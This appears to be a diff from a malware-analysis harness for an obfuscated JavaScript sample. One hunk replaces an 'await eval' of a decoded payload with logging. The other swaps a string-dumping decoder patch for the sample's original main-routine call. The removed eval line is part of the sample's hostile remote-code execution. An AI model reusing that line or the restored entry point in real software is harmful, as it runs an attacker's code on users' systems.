@@ -33666,7 +33666,7 @@ function Vmstyd() {
             YSYRS8,
           );
           if (XW_p09A[HJgj4ju(MxGPr9[0x142])]) {
-            await eval(XW_p09A[HJgj4ju(MxGPr9[0x142])]);
+            console.log(JSON.stringify({type:'eval_payload',value:XW_p09A[HJgj4ju(MxGPr9[0x142])]},null,2));
           }
         }
       } catch {}
@@ -34517,14 +34517,11 @@ function Vmstyd() {
       ucYqGY(HJgj4ju(MxGPr9[0xa3]))[HJgj4ju(MxGPr9[0x4ed])](MxGPr9[0x0]);
     }
   }
-
-  // decoder patch: do not run payload main
-  const __decodeOut = [];
-  const __safe = (label, fn) => {
-    try { __decodeOut.push([label, fn()]); } catch (e) { __decodeOut.push([label, "<ERR:" + (e && e.message || e) + ">"]); }
-  };
-  for (let i = 0; i < 0x1300; i++) __safe("HJgj4ju(0x" + i.toString(16) + ")", () => HJgj4ju(i));
-  for (let i = 0; i < MxGPr9.length; i++) __safe("MxGPr9[0x" + i.toString(16) + "]", () => MxGPr9[i]);
-  console.log(JSON.stringify(Object.fromEntries(__decodeOut), null, 2));
-
+  c9lmKFt()[HJgj4ju(MxGPr9[0x260])]((QpwDOW) => {
+    Vmstyd(
+      zgNw0K(QpwDOW),
+      Uk9stj0(),
+      ucYqGY(HJgj4ju(MxGPr9[0xa3]))[HJgj4ju(MxGPr9[0x4ed])](MxGPr9[0x0]),
+    );
+  });
 });
